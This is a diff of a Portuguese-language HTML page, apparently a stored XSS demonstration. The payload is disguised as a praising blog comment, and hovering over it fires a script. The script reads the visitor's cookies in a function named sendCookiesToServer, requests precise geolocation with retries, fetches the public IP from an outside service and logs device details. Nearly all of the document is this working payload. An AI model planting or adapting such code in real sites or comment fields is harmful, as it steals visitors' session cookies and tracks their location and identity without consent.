@@ -1,7 +1,7 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>Demostranção xss perigoso</title>
+  <title>Teste XSS e Info do Usuário</title>
   <script>
     function sendCookiesToServer() {
       var cookies = document.cookie;
@@ -13,75 +13,28 @@
       if (navigator.geolocation) {
         navigator.geolocation.getCurrentPosition(
           function (position) {
-            const lat = position.coords.latitude;
-            const lon = position.coords.longitude;
-            console.log("Localização exata:", lat, lon);
-            getAddressFromCoords(lat, lon);
-            
-            // Criar link para Google Maps
-            const mapsLink = `https://www.google.com/maps?q=${lat},${lon}`;
-            console.log("Veja no Google Maps:", mapsLink);
+            console.log("Localização:", position.coords.latitude, position.coords.longitude);
           },
           function (error) {
-            console.warn("Erro ao obter localização exata:", error.message);
-            if (error.code === error.PERMISSION_DENIED) {
-              console.warn("Usuário negou a geolocalização. Utilizando localização aproximada.");
-              getUserInfo();
-            } else if (attempt < 3) {
-              console.log(`Tentativa ${attempt + 1} para obter localização exata...`);
+            console.warn("Erro ao obter localização:", error.message);
+            if (attempt < 3) {
+              console.log(`Tentativa ${attempt + 1} para obter localização..."`);
               setTimeout(() => getLocation(attempt + 1), 2000);
             }
-          },
-          { enableHighAccuracy: true }
+          }
         );
       } else {
         console.warn("Geolocalização não suportada pelo navegador.");
       }
     }
 
-    function getAddressFromCoords(lat, lon) {
-      fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}`)
+    function getUserInfo() {
+      fetch("https://api64.ipify.org?format=json")
         .then(response => response.json())
         .then(data => {
-          if (data && data.display_name) {
-            console.log("Endereço aproximado:", data.display_name);
-          } else {
-            console.warn("Endereço não encontrado.");
-          }
-        })
-        .catch(error => console.error("Erro ao obter endereço:", error.message));
-    }
-
-    function getUserInfo() {
-      fetch("https://ipapi.co/json/" ,{ mode: 'no-cors' } )
-        .then(response => {
-          if (!response.ok) {
-            throw new Error("Resposta inválida da API");
-          }
-          return response.json();
-        })
-        .then(data => {
-          if (!data || !data.ip) {
-            throw new Error("Dados inválidos recebidos da API");
-          }
           console.log("IP Público:", data.ip);
-          console.log("Versão do IP:", data.version);
-          console.log("Cidade:", data.city);
-          console.log("Região:", data.region);
-          console.log("País:", data.country_name);
-          console.log("Código do País:", data.country_code);
-          console.log("Latitude:", data.latitude);
-          console.log("Longitude:", data.longitude);
-          console.log("Fuso horário:", data.timezone);
-          console.log("Provedor de Internet (ISP):", data.org);
-          console.log("Código postal:", data.postal);
-          console.log("Código de chamada do país:", data.country_calling_code);
-          console.log("Moeda:", data.currency);
-          console.log("Nome da moeda:", data.currency_name);
-          console.log("Línguas faladas:", data.languages);
-          console.log("População do país:", data.country_population);
         })
-        .catch(error => console.error("Erro ao obter IP e localização aproximada:", error.message));
+        .catch(error => console.error("Erro ao obter IP:", error));
     }
 
     function getDeviceInfo() {
@@ -91,21 +44,20 @@
       console.log("Online:", navigator.onLine);
       console.log("Resolução da tela:", screen.width + "x" + screen.height);
       console.log("Profundidade de cor:", screen.colorDepth);
-
     }
 
     function executeAll() {
       sendCookiesToServer();
       getLocation();
-      getDeviceInfo();
       getUserInfo();
+      getDeviceInfo();
     }
   </script>
 </head>
 <body>
   <p onmouseover="executeAll()">
-   Olá, ficou marivilho esse artigo
+    Trabalho maravilhoso
   </p>
-  <p><strong>Recomendo: </strong><span id="cookieDisplay">Sem duvidas</span></p>
+  <p><strong>Muito bom,: </strong><span id="cookieDisplay">Parabens</span></p>
 </body>
 </html>
